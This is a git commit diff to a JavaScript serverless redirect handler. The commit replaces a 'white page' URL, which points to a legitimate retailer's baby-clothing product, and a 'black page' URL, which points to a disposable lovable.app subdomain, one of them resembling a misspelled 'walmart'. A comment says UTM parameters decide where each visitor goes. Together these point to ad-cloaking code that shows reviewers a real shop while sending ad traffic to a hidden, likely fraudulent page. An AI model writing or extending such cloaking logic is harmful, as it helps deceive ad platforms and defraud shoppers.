df99a1eea0a5bea152ecb6e3ee28e8c86e40a18a
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-12 22:38:43 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.wilsonandfrenchy.com.au/products/golden-wave-stripe-organic-knitted-set";
-    const blackPageURL = "https://walmrrtquzzzz.lovable.app/?";
+    const whitePageURL = "https://www.naturebaby.com.au/products/piper-cardigan-ribbon?variant=45758902403237";
+    const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
